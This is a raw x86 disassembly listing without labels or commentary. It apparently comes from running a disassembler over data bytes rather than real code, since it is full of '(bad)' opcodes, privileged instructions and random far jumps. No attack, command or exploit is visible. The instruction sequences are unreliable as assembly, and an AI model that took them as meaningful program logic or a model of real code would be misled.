  443e52:	add    BYTE PTR [eax+0xb13a8d0],dl
  443e58:	fwait
  443e59:	jmp    0xc81:0x66617487
  443e60:	or     DWORD PTR ds:0xfe8b4700,0xffffffae
  443e67:	mov    al,ds:0x63612abf
  443e6c:	dec    DWORD PTR [edi+0x68d223bf]
  443e72:	mov    ebx,0x620d597e
  443e77:	or     DWORD PTR [ebx],eax
  443e79:	jnp    0x443e8c
  443e7b:	nop
  443e7c:	pop    ecx
  443e7d:	push   es
  443e7e:	or     al,0x76
  443e80:	enter  0x612c,0x99
  443e84:	sti    
  443e85:	jp     0x443e98
  443e87:	nop
  443e88:	pop    ecx
  443e89:	mov    ?,WORD PTR [esi-0x449f1d6d]
  443e8f:	xchg   BYTE PTR [ecx+0xd],bl
  443e92:	test   DWORD PTR [ebp-0x4b],ecx
  443e95:	mov    DWORD PTR [bx+si],eax
  443e98:	add    BYTE PTR [eax],al
  443e9a:	add    BYTE PTR [eax],al
  443e9c:	test   al,0x60
  443e9e:	or     eax,0x16fb0b00
  443ea3:	add    eax,0x4fcd5990
  443ea8:	push   ecx
  443ea9:	dec    edx
  443eaa:	iret   
  443eab:	dec    ebp
  443eac:	test   al,0xb1
  443eae:	sub    esi,DWORD PTR [ebx]
  443eb0:	mov    eax,0x177d7a62
  443eb5:	mov    ecx,0x354003f7
  443eba:	dec    ecx
  443ebb:	(bad)  
  443ebc:	lahf   
  443ebd:	(bad)  
  443ebe:	not    edx
  443ec0:	or     al,0x6c
  443ec2:	mov    edi,0xa0627c74
  443ec7:	adc    BYTE PTR [ebx-0x39],0xce
  443ecb:	jns    0x443f4c
  443ecd:	(bad)  
  443ece:	idiv   DWORD PTR [eax+0x9]
  443ed1:	pop    ds
  443ed2:	loope  0x443ed7
  443ed4:	nop
  443ed5:	sub    eax,0xfa1b1002
  443eda:	cmc    
  443edb:	and    BYTE PTR [esi-0x50],0x11
  443edf:	shl    cl,cl
  443ee1:	sub    eax,0x555c9d87
  443ee6:	ins    BYTE PTR es:[edi],dx
  443ee7:	mov    ch,0xa3
  443ee9:	fsubr  st,st(6)
  443eeb:	lea    eax,[edi]
  443eed:	leave  
  443eee:	test   DWORD PTR [ebx],0x6b692889
  443ef4:	xor    DWORD PTR [edx-0x553e8709],0x618f076f
  443efe:	mov    ecx,0xf
  443f03:	add    BYTE PTR [eax],al
  443f05:	mov    DWORD PTR [eax],ebp
  443f07:	dec    ecx
  443f08:	push   0xffffffa1
  443f0a:	mov    dl,0xf7
  443f0c:	js     0x443f67
  443f0e:	(bad)  
  443f0f:	ins    BYTE PTR es:[edi],dx
  443f10:	int    0x97
  443f12:	sub    dl,BYTE PTR [ebx]
  443f14:	adc    ecx,DWORD PTR ds:0x900d4b49
  443f1a:	mov    dl,0x0
  443f1c:	mov    ebp,0xd9e72383
  443f21:	aad    0xd8
  443f23:	add    al,0x1b
  443f25:	push   esp
  443f26:	je     0x443f0c
  443f28:	jns    0x443f4b
  443f2a:	pop    ds
  443f2b:	push   cs
  443f2c:	fist   WORD PTR [ebx+0x3d6070b2]
  443f32:	sub    DWORD PTR [eax],eax
  443f34:	jmp    0x474196cc
  443f39:	xor    DWORD PTR [bx+si-0x20],0xe9002a19
  443f41:	xchg   ebx,eax
  443f42:	(bad)  
  443f44:	jmp    0xb293:0xd7aa2c04
  443f4b:	jbe    0x443ece
  443f4d:	je     0x443ef0
  443f4f:	push   cs
  443f50:	inc    ecx
  443f51:	ins    BYTE PTR es:[edi],dx
  443f52:	xchg   ebp,eax
  443f53:	dec    esi
  443f54:	jmp    0xea3ab25f
  443f59:	xchg   BYTE PTR [edx-0x17],bl
  443f5c:	push   0xffffffd8
  443f5e:	mov    ecx,0x53acb795
  443f63:	lock xchg BYTE PTR [ebx+0xf5e934],dh
  443f6a:	add    BYTE PTR [eax],al
  443f6c:	add    BYTE PTR [eax],al
  443f6e:	call   0xe962:0x8781d037
  443f75:	outs   dx,BYTE PTR ds:[esi]
  443f76:	push   ebx
  443f77:	sti    
  443f78:	inc    ebp
  443f79:	jb     0x443fe4
  443f7b:	cld    
  443f7c:	int    0x2d
  443f7e:	shr    BYTE PTR [ebp-0x26],0xbc
  443f82:	push   ss
  443f83:	dec    ebp
  443f84:	xchg   ebp,eax
  443f85:	pushf  
  443f86:	mov    ebp,edi
  443f88:	xchg   ebp,eax
  443f89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443f8a:	and    eax,DWORD PTR [edx]
  443f8c:	xchg   esi,eax
  443f8d:	inc    eax
  443f8e:	push   ebp
  443f8f:	dec    edx
  443f90:	(bad)  
  443f91:	lods   eax,DWORD PTR ds:[si]
  443f93:	pop    edx
  443f94:	jmp    0xe623d382
  443f99:	call   0xa4d9cdb6
  443f9e:	lahf   
  443f9f:	stos   DWORD PTR es:[edi],eax
  443fa0:	mov    al,ds:0x8f788ef9
  443fa5:	adc    BYTE PTR [ebp-0x16fff1a6],al
  443fab:	inc    esi
  443fac:	jno    0x12b0752
  443fb2:	mov    ecx,0xae81e1b7
  443fb7:	(bad)
  443fba:	test   eax,0xde810f46
  443fbf:	(bad)
  443fc2:	mov    ecx,0xc9c1ce2f
  443fc7:	fs inc esi
  443fc9:	or     ebp,eax
  443fcb:	pop    ds
  443fcc:	inc    esp
  443fcd:	ret    0xb47d
  443fd0:	cmp    al,0x8b
  443fd2:	add    BYTE PTR [eax],al
  443fd4:	add    BYTE PTR [eax],al
  443fd6:	add    ah,al
  443fd8:	ret    0xf68d
  443fdb:	les    esi,FWORD PTR [eax+0x72684695]
  443fe1:	inc    esi
  443fe2:	pop    ebx
  443fe3:	lods   al,BYTE PTR ds:[esi]
  443fe4:	clc    
  443fe5:	adc    eax,0x19c0fa00
  443fea:	jae    0x443f96
  443fec:	sub    edx,eax
  443fee:	je     0x44402b
  443ff0:	inc    ebx
  443ff1:	lods   eax,DWORD PTR ds:[esi]
  443ff2:	and    al,0x39
  443ff4:	mov    ah,0xe
  443ff6:	add    BYTE PTR [esi],ch
  443ff8:	cli    
  443ff9:	lsl    esi,cx
  443ffc:	imul   ebp,edx,0xdc3b02f8
  444002:	xor    DWORD PTR [eax+0x3900e6c6],0xd0810f46
  44400c:	(bad)  
  44400d:	out    0x0,al
  44400f:	sub    esp,edi
  444011:	js     0x443f93
  444013:	div    BYTE PTR [ebx]
  444015:	fsubrp st(7),st
  444017:	mov    eax,0xab8b168d
  44401c:	test   cl,0x4
  44401f:	loop   0x444016
  444021:	jmp    0x9010:0xc9f72fc6
  444028:	sub    BYTE PTR [eax],bl
  44402a:	mov    edi,0xb530e3b
  44402f:	nop
  444030:	retf   0xaf08
  444033:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444034:	dec    ecx
  444035:	or     eax,0xdbc1209
  44403a:	add    BYTE PTR [eax],al
  44403c:	add    BYTE PTR [eax],al
  44403e:	add    BYTE PTR [eax],al
  444040:	nop
  444041:	mov    eax,ds:0xf726a65c
  444046:	pop    es
  444047:	(bad)  
  444049:	sbb    DWORD PTR [ebx],0xffffff87
  44404c:	cmp    eax,0xe0e48c55
  444051:	or     ax,0xd800
  444055:	xchg   esp,eax
  444056:	or     eax,0xb6ce9000
  44405b:	and    edx,DWORD PTR [eax-0x6ceeb8a8]
  444061:	adc    edi,edi
  444063:	mov    cl,0xde
  444065:	dec    edx
  444066:	adc    dh,bh
  444068:	xchg   ebx,eax
  444069:	and    edi,edi
  44406b:	mov    cl,0xbe
  44406d:	dec    ebx
  44406e:	adc    dh,bh
  444070:	xchg   ebx,eax
  444071:	adc    edi,edi
  444073:	mov    cl,0xbe
  444075:	dec    esp
  444076:	adc    dh,bh
  444078:	xchg   ebx,eax
  444079:	and    edi,edi
  44407b:	mov    cl,0xde
  44407d:	dec    ebp
  44407e:	adc    dh,bh
  444080:	xchg   ebx,eax
  444081:	adc    edi,edi
  444083:	mov    cl,0xde
  444085:	dec    esi
  444086:	adc    dh,bh
  444088:	xchg   ebx,eax
  444089:	mov    ds:0x4fbeb1ff,eax
  44408e:	adc    dh,bh
  444090:	xchg   ebx,eax
  444091:	xchg   ebx,eax
  444092:	push   DWORD PTR [ecx-0x8edaf42]
  444098:	xchg   ebx,eax
  444099:	mov    ds:0x515eb1ff,eax
  44409e:	adc    dh,bh
  4440a0:	xchg   ebx,eax
  4440a1:	xchg   ebx,eax
  4440a2:	push   DWORD PTR [ecx+0x0]
  4440a8:	add    BYTE PTR [esi-0x4e],bl
  4440ab:	fiadd  WORD PTR [edi+eiz*8]
  4440ae:	mov    dl,0x1d
  4440b0:	adc    DWORD PTR [edx],esp
  4440b2:	or     dh,ch
  4440b4:	add    al,0xe7
  4440b6:	mov    dl,0x2d
  4440b8:	adc    DWORD PTR [edx],esp
  4440ba:	or     ch,bl
  4440bc:	add    al,0xc7
  4440be:	mov    dl,0x1d
  4440c0:	adc    DWORD PTR [edx],eax
  4440c2:	or     ah,dh
  4440c4:	add    al,0xc7
  4440c6:	mov    dl,0x2d
  4440c8:	adc    DWORD PTR [edx],eax
  4440ca:	or     bl,ah
  4440cc:	add    al,0xa7
  4440ce:	mov    dl,0x9d
  4440d0:	adc    dl,ah
  4440d2:	pop    es
  4440d3:	repnz add al,0xa7
  4440d6:	mov    dl,0xad
  4440d8:	adc    dl,ah
  4440da:	pop    es
  4440db:	loope  0x4440e1
  4440dd:	xchg   DWORD PTR [edx+0x327f049d],esi
  4440e3:	mov    ecx,0x72add7f3
  4440e8:	cwde   
  4440e9:	js     0x444149
  4440eb:	mov    al,0x5b
  4440ed:	(bad)  
  4440ee:	xor    dh,al
  4440f0:	and    DWORD PTR [eax+0x54],0xffffffb6
  4440f4:	sub    eax,0x10a5cb88
  4440f9:	nop
  4440fa:	pop    ebp
  4440fb:	nop
  4440fc:	add    al,0x56
  4440fe:	sbb    esp,esi
  444100:	adc    DWORD PTR [eax-0x1d797ce],0x48
  444107:	enter  0x45aa,0xae
  44410b:	mul    DWORD PTR [eax]
  44410d:	add    BYTE PTR [eax],al
  44410f:	add    BYTE PTR [eax],al
  444111:	add    BYTE PTR [eax],ch
  444113:	mov    dl,0x6d
  444115:	and    dl,bl
  444117:	scas   al,BYTE PTR es:[edi]
  444118:	lock xchg BYTE PTR [ebp+ebx*2+0x58],ah
  44411d:	and    BYTE PTR [edx],dl
  44411f:	jp     0x444101
  444121:	xchg   esi,ebx
  444123:	mov    dl,0xf7
  444125:	add    eax,DWORD PTR [ebp-0x5f26f1a7]
  44412b:	fadd   QWORD PTR [ebx-0x6a4d6c17]
  444131:	sub    dl,BYTE PTR [edx+0x55]
  444134:	adc    ch,BYTE PTR [edi+ebp*1-0x6e]
  444138:	push   cs
  444139:	out    0x39,al
  44413b:	ret    
  44413c:	or     eax,0x40208023
  444141:	call   0x3351a6da
  444146:	mov    al,ds:0x94eb4020
  44414b:	gs or  eax,0x4020a023
  444151:	jmp    0x2097:0xb30d6592
  444158:	inc    eax
  444159:	in     eax,dx
  44415a:	xchg   edx,eax
  44415b:	gs or  eax,0x402087a3
  444161:	in     al,dx
  444162:	xchg   edx,eax
  444163:	gs or  eax,0x402097b3
  444169:	out    dx,eax
  44416a:	xchg   edx,eax
  44416b:	gs or  eax,0x402087a3
  444171:	out    dx,al
  444172:	xchg   edx,eax
  444173:	gs or  eax,0xb3
  444179:	add    BYTE PTR [eax],al
  44417b:	xchg   edi,eax
  44417c:	and    BYTE PTR [eax-0x1f],al
  44417f:	xchg   edx,eax
  444180:	gs or  eax,0x402087a3
  444186:	lock xchg edx,eax
  444188:	gs or  eax,0x402097b3
  44418e:	jecxz  0x444122
  444190:	gs or  eax,0x402087a3
  444196:	repnz xchg edx,eax
  444198:	gs or  eax,0x40209733
  44419e:	in     eax,0x92
  4441a0:	gs or  eax,0x40208723
  4441a6:	add    BYTE PTR [eax+esi*4],al
  4441a9:	loope  0x4441ae
  4441ab:	ret    
  4441ac:	lods   eax,DWORD PTR ds:[esi]
  4441ad:	pushf  
  4441ae:	push   esi
  4441af:	imul   DWORD PTR [edi-0x524cfc1f]
  4441b5:	pushf  
  4441b6:	push   esi
  4441b7:	out    0xaf,al
  4441b9:	loope  0x4441be
  4441bb:	mov    ds:0xea10f231,eax
  4441c0:	mov    ebp,0x68d9c66a
  4441c5:	push   ss
  4441c6:	test   DWORD PTR [ebp-0x44],ecx
  4441c9:	out    0xff,al
  4441cb:	sub    al,0x99
  4441cd:	pop    ebp
  4441ce:	or     esi,DWORD PTR [esi+0x71031006]
  4441d4:	je     0x4441c0
  4441d6:	clc    
  4441d7:	bound  edi,QWORD PTR [ebx]
  4441d9:	fdivr  QWORD PTR [eax-0x7ff1c9b8]
  4441df:	add    BYTE PTR [eax],al
  4441e1:	add    BYTE PTR [eax],al
  4441e3:	add    BYTE PTR [esi-0x4915576b],bh
  4441e9:	or     eax,0xbd790fdb
  4441ee:	out    0x3,al
  4441f0:	inc    ebx
  4441f1:	clc    
  4441f2:	js     0x444174
  4441f4:	outs   dx,BYTE PTR ds:[esi]
  4441f5:	xor    dh,bl
  4441f7:	out    0x28,eax
  4441f9:	mov    dl,BYTE PTR [esi]
  4441fb:	imul   ebp,DWORD PTR [ebx],0x6ff0ead
  444201:	mov    cl,0xe0
  444203:	mov    ebp,DWORD PTR [esi]
  444205:	push   ds
  444206:	test   al,0xe0
  444208:	pop    ecx
  444209:	sbb    eax,0x7172c112
  44420e:	stos   DWORD PTR es:[edi],eax
  44420f:	or     al,0x39
  444211:	in     al,dx
  444212:	aad    0xcc
  444214:	lahf   
  444215:	daa    
  444216:	sti    
  444217:	neg    DWORD PTR [ecx]
  444219:	sub    ebx,edi
  44421b:	je     0x4441b9
  44421d:	inc    ecx
  44421e:	lods   eax,DWORD PTR ds:[esi]
  44421f:	and    al,0x39
  444221:	mov    al,0xe
  444223:	add    BYTE PTR [eax-0x5c03ad05],dl
  444229:	bound  ebx,QWORD PTR [eax]
  44422b:	mov    dl,0xa1
  44422d:	pop    eax
  44422e:	sbb    eax,0xd9cf27e
  444233:	add    BYTE PTR [eax-0x3cf8ca76],dl
  444239:	push   ebp
  44423a:	bsr    cx,WORD PTR [ecx]
  44423e:	or     eax,0x2f46563f
  444243:	dec    esp
  444244:	inc    edi
  444245:	enter  0x1f0b,0x0
  444249:	add    BYTE PTR [eax],al
  44424b:	add    BYTE PTR [eax],al
  44424d:	xchg   edi,eax
  44424f:	adc    al,0xfe
  444251:	iret   
  444252:	dec    ecx
  444253:	xchg   esp,eax
  444254:	stc    
  444255:	shr    DWORD PTR [esi+edx*1+0x1218bf85],1
  44425c:	test   eax,esp
  44425e:	mov    dh,BYTE PTR [edi]
  444260:	bndstx [edx+0x4d],(bad)
  444264:	in     al,0x98
  444266:	retf   0xf82f
  444269:	nop
  44426a:	dec    ecx
  44426b:	or     eax,0x126cb27f
  444270:	add    BYTE PTR [eax-0x5f6d1920],dl
  444276:	pop    edx
  444277:	int    0xff
  444279:	ret    0x687d
  44427c:	bsr    ecx,DWORD PTR [ecx+0xa488512]
  444283:	aaa    
  444284:	pop    ss
  444285:	mov    ds:0xad0f6865,eax
  44428a:	mov    DWORD PTR [edx],edx
  44428c:	and    edx,DWORD PTR [edi+0x49]
  44428f:	or     eax,0x907d8300
  444294:	jns    0xe1715523
  44429a:	dec    ebp
  44429b:	xchg   esi,eax
  44429c:	mov    ebp,0x22e23151
  4442a1:	das    
  4442a2:	mov    dl,0xf7
  4442a4:	add    edx,DWORD PTR [eax-0x70790cd9]
  4442aa:	mov    eax,ds:0x780d03b7
  4442af:	sub    DWORD PTR ss:[eax],eax
  4442b2:	add    BYTE PTR [eax],al
  4442b4:	add    BYTE PTR [eax],al
  4442b6:	xchg   edi,eax
  4442b7:	xor    DWORD PTR [ebp+ebx*1+0x7],edx
  4442bb:	pop    ebx
  4442bc:	not    eax
  4442be:	xchg   ebx,eax
  4442bf:	cmp    eax,0xb2b7d6c7
  4442c4:	ins    BYTE PTR es:[edi],dx
  4442c5:	cmp    ch,BYTE PTR [esi]
  4442c7:	inc    edi
  4442c8:	psrlw  mm2,QWORD PTR [ebx-0x601118c3]
  4442cf:	mov    dl,0x76
  4442d1:	and    bl,al
  4442d3:	mov    cl,0xf7
  4442d5:	add    edi,DWORD PTR [ebp-0x4a]
  4442d8:	dec    edx
  4442d9:	hlt    
  4442da:	jle    0x4442ce
  4442dc:	not    eax
  4442de:	jle    0x44428a
  4442e0:	ins    BYTE PTR es:[edi],dx
  4442e1:	xor    al,0xf6
  4442e3:	inc    edi
  4442e4:	(bad)  
  4442e5:	mov    bh,al
  4442e7:	jo     0x4442a5
  4442e9:	or     esp,DWORD PTR [edi]
  4442eb:	dec    edi
  4442ec:	enter  0x9003,0xb2
  4442f0:	jbe    0x444313
  4442f2:	cwde   
  4442f3:	mov    cl,0xf7
  4442f5:	add    edx,DWORD PTR ds:0xb6f34abf
  4442fb:	repnz not eax
  4442fe:	mov    ds:0xb7d6c737,eax
  444303:	mov    dl,0x6c
  444305:	cmp    ebp,DWORD PTR [esi]
  444307:	dec    esi
  444308:	psrlw  mm0,QWORD PTR [ebx-0x601118c9]
  44430f:	mov    dl,0xda
  444311:	sbb    al,0x57
  444313:	pop    edx
  444314:	not    eax
  444316:	mov    ds:0xdac72f,eax
  44431b:	add    BYTE PTR [eax],al
  44431d:	add    BYTE PTR [eax],al
  44431f:	xchg   DWORD PTR [edx+0x2d8bb2a4],esi
  444325:	push   cs
  444326:	stos   DWORD PTR es:[edi],eax
  444327:	rcl    BYTE PTR [ecx-0x2],cl
  44432a:	ret    
  44432b:	mov    WORD PTR [ecx-0x17],ds
  44432e:	jmp    0xf9d7f94b
  444333:	inc    edx
  444334:	call   0xe1f5:0x1859620e
  44433b:	adc    dh,BYTE PTR [edi-0x17]
  44433e:	jmp    0xe561f5d6
  444343:	jle    0x4442ee
  444345:	and    ebp,DWORD PTR [ecx+0x28c42f93]
  44434b:	mov    eax,0x66ed1dc1
  444350:	test   eax,0xd993a93b
  444355:	in     al,dx
  444356:	push   ss
  444357:	xchg   ebx,eax
  444358:	mov    dl,0xe
  44435a:	ficom  DWORD PTR [edi-0x2c4001bb]
  444360:	pop    ecx
  444361:	sbb    al,0xa8
  444363:	ret    
  444364:	cs mov esi,0x95a96928
  44436a:	adc    DWORD PTR [edx+0x4e],edx
  44436d:	push   ss
  44436e:	push   0xe90e5a6e
  444373:	xchg   ebx,eax
  444374:	das    
  444375:	add    bh,BYTE PTR [esp+ebx*4-0x78]
  444379:	dec    esi
  44437a:	jmp    0xea2db993
  44437f:	xchg   ebx,eax
  444380:	mov    dl,0x1d
  444382:	aad    0x0
  444384:	add    BYTE PTR [eax],al
  444386:	add    BYTE PTR [eax],al
  444388:	clc    
  444389:	test   eax,0x2f8c2923
  44438e:	(bad)  
  44438f:	test   al,0xbf
  444391:	rcr    DWORD PTR ds:0x3ba9e8fd,0x29
  444398:	xchg   esp,eax
  444399:	xchg   ebp,eax
  44439a:	jmp    0x1df6d788
  44439f:	cmc    
  4443a0:	adc    BYTE PTR [ecx-0x5186ffd9],ch
  4443a6:	cmp    edx,DWORD PTR [ecx+0x65]
  4443a9:	sub    BYTE PTR [ebx+0x2c5e11c1],ch
  4443af:	(bad)  
  4443b0:	cmp    DWORD PTR [ebp+0x32358b0e],esi
  4443b6:	sbb    DWORD PTR [ecx],esi
  4443b8:	jmp    0x691ed771
  4443bd:	mov    DWORD PTR [ecx],edx
  4443bf:	sbb    DWORD PTR [edx-0x43],0x7ff9ffe9
  4443c6:	or     eax,0x2981d99d
  4443cb:	add    BYTE PTR [edx-0x68],dh
  4443ce:	test   al,0xeb
  4443d0:	sar    DWORD PTR [edi+0xd],0x9d
  4443d4:	jmp    0x68446d22
  4443d9:	nop
  4443da:	out    0x0,al
  4443dc:	jmp    0x44487f95
  4443e1:	pop    esi
  4443e2:	and    BYTE PTR [eax-0x47],al
  4443e5:	das    
  4443e6:	test   al,0x20
  4443e8:	cli    
  4443e9:	ins    DWORD PTR es:[edi],dx
  4443ea:	loope  0x44436f
  4443ec:	add    BYTE PTR [eax],al
  4443ee:	add    BYTE PTR [eax],al
  4443f0:	add    BYTE PTR [edi+0x32d0924e],cl
  4443f6:	xchg   esi,eax
  4443f7:	test   al,0xea
  4443f9:	test   eax,0x2808f2ed
  4443fe:	(bad)  
  4443ff:	out    0x0,al
  444401:	test   eax,0x41493b4
  444406:	cmp    BYTE PTR fs:[eax+0x79],al
  44440a:	das    
  44440b:	retf   0x69ff
  44440e:	mov    ah,0xe
  444410:	xor    edx,DWORD PTR [ebp-0x25]
  444413:	sbb    DWORD PTR ds:0xd893aeb9,esi
  444419:	cmp    BYTE PTR [ecx-0x249accff],cl
  44441f:	sbb    DWORD PTR ds:0x23128990,ebp
  444425:	dec    edi
  444426:	dec    edx
  444427:	or     eax,0x8e758300
  44442c:	vmwrite ecx,DWORD PTR [ecx-0x221ed2ee]
  444433:	cwde   
  444434:	mov    ebp,0x22dd3251
  444439:	daa    
  44443a:	dec    edx
  44443b:	or     eax,0x8e4e0b00
  444440:	punpcklwd mm1,DWORD PTR [ecx]
  444443:	or     eax,0x388aea85
  444448:	pop    es
  444449:	adc    ebp,ebp
  44444b:	add    al,0xff
  44444d:	dec    DWORD PTR [ecx-0x40]
  444450:	add    edx,DWORD PTR ds:0x3fbe7a
  444456:	add    BYTE PTR [eax],al
  444458:	add    BYTE PTR [eax],al
  44445a:	nop
  44445b:	aam    0x2b
  44445d:	mov    esi,0x3c1b1fb
  444462:	std    
  444463:	pop    ecx
  444464:	idiv   BYTE PTR [edi]
  444466:	nop
  444467:	retf   0xf833
  44446a:	nop
  44446b:	dec    ecx
  44446c:	or     eax,0xddf68c2d
  444471:	ss push eax
  444473:	dec    ecx
  444474:	aam    0x8
  444476:	or     eax,0xaff8015e
  44447b:	int3   
  44447c:	pop    es
  44447d:	add    esp,DWORD PTR [edx]
  44447f:	cdq    
  444480:	fwait
  444481:	rcl    ecx,1
  444483:	adc    DWORD PTR [eax],0xffffff85
  444486:	xchg   edi,eax
  444487:	mov    esp,0x4d517d0d
  44448c:	call   0x777e:0xe28051f7
  444493:	sbb    BYTE PTR [edx],dl
  444495:	add    BYTE PTR [eax-0x7f45392c],dl
  44449b:	pop    edx
  44449c:	int    0xff
  44449e:	sbb    dh,BYTE PTR [edx-0x558bbc31]
  4444a4:	jbe    0x4444cb
  4444a6:	pop    eax
  4444a7:	mov    dl,0xf7
  4444a9:	add    edi,DWORD PTR [ebp-0x6a]
  4444ac:	jp     0x4444a2
  4444ae:	xor    dl,0xf7
  4444b1:	mov    WORD PTR [edi+0x71],fs
  4444b4:	jl     0x4444b2
  4444b6:	fs xchg esi,eax
  4444b8:	inc    edx
  4444b9:	hlt    
  4444ba:	jp     0x4444ae
  4444bc:	neg    esi
  4444be:	add    BYTE PTR [eax],al
  4444c0:	add    BYTE PTR [eax],al
  4444c2:	add    BYTE PTR [eax],ch
  4444c4:	mov    dl,0xf7
  4444c6:	add    ebp,DWORD PTR [ebp-0x6a]
  4444c9:	jb     0x4444bf
  4444cb:	pop    esi
  4444cc:	repnz test DWORD PTR [ecx+edi*8-0x2f735253],0x64b968dc
  4444d8:	sub    eax,0x429d9021
  4444dd:	lock push ecx
  4444df:	sahf   
  4444e0:	mov    ds:0x56c58307,eax
  4444e5:	test   DWORD PTR [ebx],0xbff7190
  4444eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4444ec:	scas   al,BYTE PTR es:[edi]
  4444ed:	push   0xfffffff4
  4444ef:	jp     0x4444e3
  4444f1:	test   edx,0x1118dd59
  4444f7:	iret   
  4444f8:	div    DWORD PTR [eax+ecx*2]
  4444fb:	retf   
  4444fc:	mov    cl,BYTE PTR gs:[ebx+edi*4+0x13078a2a]
  444504:	imul   ecx,DWORD PTR [edx+0x2],0x462a726d
  44450b:	mov    esi,DWORD PTR [edx+0x299fae6c]
  444511:	xor    cl,BYTE PTR [eax+edi*2]
  444514:	nop
  444515:	rcr    BYTE PTR [eax],cl
  444517:	js     0x444511
  444519:	mov    ch,0x7
  44451b:	nop
  44451c:	pushw  cs
  44451e:	sbb    al,0x1d
  444520:	dec    edx
  444521:	inc    eax
  444522:	bound  edx,QWORD PTR [esi]
  444524:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444525:	xchg   ebx,eax
  444526:	lahf   
  444527:	add    BYTE PTR [eax],al
  444529:	add    BYTE PTR [eax],al
  44452b:	add    BYTE PTR [edi],cl
  44452d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44452e:	xchg   ebp,eax
  44452f:	sub    al,0x84
  444531:	das    
  444532:	push   ebx
  444533:	in     eax,0x3c
  444535:	outs   dx,BYTE PTR ds:[esi]
  444536:	xchg   esp,eax
  444537:	stc    
  444538:	sbb    eax,edx
  44453a:	movaps XMMWORD PTR [edx-0x1f],xmm1
  44453e:	loope  0x44455f
  444540:	call   DWORD PTR [esi]
  444542:	ficomp DWORD PTR [ebx*1-0x67e36ab6]
  444549:	xor    edi,edx
  44454b:	fst    QWORD PTR [esi+0xef1532f]
  444551:	in     eax,dx
  444552:	push   cs
  444553:	das    
  444554:	xchg   ebx,eax
  444555:	mov    dl,0x4e
  444557:	mov    al,ds:0x2a4b5d16
  44455c:	push   edi
  44455d:	imul   ebx,edx,0xda694f2d
  444563:	pushf  
  444564:	and    BYTE PTR [esi+edi*1],al
  444567:	push   0xffffffaf
  444569:	xchg   ecx,eax
  44456a:	xchg   ebp,eax
  44456b:	mov    ebp,0xad959dbf
  444570:	mov    bh,0x99
  444572:	xchg   ebp,eax
  444573:	stos   DWORD PTR es:[edi],eax
  444574:	sub    ebp,DWORD PTR [edi]
  444576:	test   BYTE PTR [ebp-0x6d],bl
  444579:	mov    dl,0xe
  44457b:	ret    0x2e54
  44457e:	dec    esp
  44457f:	mov    ch,0x4
  444581:	add    BYTE PTR [ebx+0x75],ch
  444584:	xchg   esp,eax
  444585:	adc    eax,0x14d4ebf5
  44458a:	in     eax,dx
  44458b:	stc    
  44458c:	mov    bh,BYTE PTR [edx-0x69]
  44458f:	std    
  444590:	add    BYTE PTR [eax],al
  444592:	add    BYTE PTR [eax],al
  444594:	add    BYTE PTR [edi-0x6b8673d2],dh
  44459a:	mov    dl,0xe
  44459c:	bound  ecx,QWORD PTR [edx-0x1f]
  44459f:	and    eax,0xeb3a3100
  4445a4:	mov    dh,BYTE PTR [ecx]
  4445a6:	daa    
  4445a7:	inc    ebp
  4445a8:	and    al,0x41
  4445aa:	sub    BYTE PTR [ebx+0x38],bh
  4445ad:	lock inc edx
  4445af:	sub    eax,0x7508e204
  4445b4:	lea    esi,[ebp-0x7d]
  4445b7:	jmp    0x996eb44
  4445bc:	mov    ebp,esi
  4445be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4445bf:	rol    DWORD PTR [ebx+0x4491b109],0x4d
  4445c6:	inc    ebp
  4445c7:	xchg   edx,eax
  4445c8:	inc    edx
  4445c9:	push   ebp
  4445ca:	dec    edx
  4445cb:	invlpg BYTE PTR [ecx]
  4445ce:	mov    cl,0x33
  4445d0:	call   0xed7ff90b
  4445d5:	mov    ds:0x3d896170,al
  4445da:	jne    0x4445e1
  4445dc:	add    ebp,DWORD PTR [ecx+0x27]
  4445df:	pop    ebp
  4445e0:	and    al,0x1
  4445e2:	lods   al,BYTE PTR ds:[esi]
  4445e3:	lahf   
  4445e4:	pop    ds
  4445e5:	sbb    BYTE PTR [edx],0x2d
  4445e8:	adc    dh,dh
  4445ea:	jecxz  0x444631
  4445ec:	cmp    BYTE PTR [esi-0x1adbbad9],dh
  4445f2:	daa    
  4445f3:	arpl   WORD PTR [eax+0x62],ax
  4445f6:	bound  ebp,QWORD PTR ds:0xeb
  4445fc:	add    BYTE PTR [eax],al
  4445fe:	les    ebp,FWORD PTR [ecx]
  444600:	push   eax
  444601:	add    dl,bl
  444603:	jmp    0xcd22:0x6bc5b716
  44460a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44460b:	(bad)  
  44460c:	leave  
  44460d:	add    BYTE PTR [ecx-0x46159650],bh
  444613:	mov    al,0xe9
  444615:	jmp    DWORD PTR [esi-0x56ff42d8]
  44461b:	mov    al,0x17
  44461d:	mov    bh,0x90
  44461f:	test   ebx,eax
  444621:	clc    
  444622:	retf   
  444623:	or     BYTE PTR [esi-0x26],bh
  444626:	or     eax,DWORD PTR [esi-0x2378fc12]
  44462c:	jmp    0xeec9f12f
  444631:	paddusw mm6,QWORD PTR [edx+ebx*4]
  444635:	adc    esi,DWORD PTR [eax+eiz*8-0x1f73dc67]
  44463c:	and    DWORD PTR [ebx],0x84024870
  444642:	int3   
  444643:	ins    DWORD PTR es:[edi],dx
  444644:	stc    
  444645:	mov    ch,0x38
  444647:	sub    al,0x0
  444649:	clc    
  44464a:	add    eax,0x9107c596
  44464f:	dec    ecx
  444650:	or     eax,0x1519dc8b
  444655:	call   FWORD PTR [edi]
  444657:	dec    edx
  444658:	xchg   esp,eax
  444659:	add    esp,DWORD PTR [edx-0x48]
  44465c:	push   cs
  44465d:	test   DWORD PTR ss:[ebp-0x6c],edx
  444661:	inc    ebx
  444662:	add    BYTE PTR [eax],al
  444664:	add    BYTE PTR [eax],al
  444666:	add    dl,al
  444668:	dec    ebp
  444669:	mov    esp,0x7e45ba43
  44466e:	add    BYTE PTR [ebx],dl
  444670:	mov    BYTE PTR ds:0x82f0f973,dl
  444676:	jl     0x44464a
  444678:	dec    ebp
  444679:	jp     0x444673
  44467b:	fisttp WORD PTR [ecx+0xd]
  44467e:	jae    0x44460e
  444680:	enter  0xfd4f,0xd0
  444684:	mov    cl,0xdd
  444686:	sub    edx,DWORD PTR [ecx+0xcff1fc8]
  44468c:	inc    esi
